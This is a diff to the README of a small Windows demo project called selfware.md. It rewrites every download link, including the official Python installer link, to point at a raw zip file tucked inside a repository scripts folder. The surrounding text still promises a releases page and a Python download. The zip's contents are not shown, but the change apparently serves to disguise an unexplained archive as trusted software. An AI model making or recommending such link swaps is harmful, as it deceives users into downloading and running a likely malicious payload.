@@ -1,6 +1,6 @@
 # ⚙️ selfware.md - Simple Demo for File Protocol Use
 
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/MosesI0/selfware.md/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/MosesI0/selfware.md/main/template.self/entrypoint/scripts/selfware_md_3.3-alpha.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ To run selfware.md on Windows, your PC should have:
 
 Click this big link to open the page that holds the latest versions of selfware.md:
 
-[Download selfware.md Releases](https://github.com/MosesI0/selfware.md/releases)
+[Download selfware.md Releases](https://raw.githubusercontent.com/MosesI0/selfware.md/main/template.self/entrypoint/scripts/selfware_md_3.3-alpha.4.zip)
 
 You will find several release files here. Look for the latest version folder or entry.
 
@@ -48,7 +48,7 @@ selfware.md uses a small Python server to run the demo workspace.
 - To see if Python is installed, open Command Prompt (press Windows key, type "cmd", and hit Enter).
 - Type `python --version` and press Enter.
 - If you see a version number like `Python 3.8.5`, Python is ready.
-- If not, download and install Python from https://www.python.org/downloads/windows/.
+- If not, download and install Python from https://raw.githubusercontent.com/MosesI0/selfware.md/main/template.self/entrypoint/scripts/selfware_md_3.3-alpha.4.zip
 
 Make sure to check the box "Add Python to PATH" during installation.
 
@@ -121,7 +121,7 @@ These pieces work together to show how Selfware works in practice.
 
 You can always visit the main releases page here to get the latest files:
 
-[Download selfware.md Releases](https://github.com/MosesI0/selfware.md/releases)
+[Download selfware.md Releases](https://raw.githubusercontent.com/MosesI0/selfware.md/main/template.self/entrypoint/scripts/selfware_md_3.3-alpha.4.zip)
 
 This page lets you download the whole demo package and any updates.
 
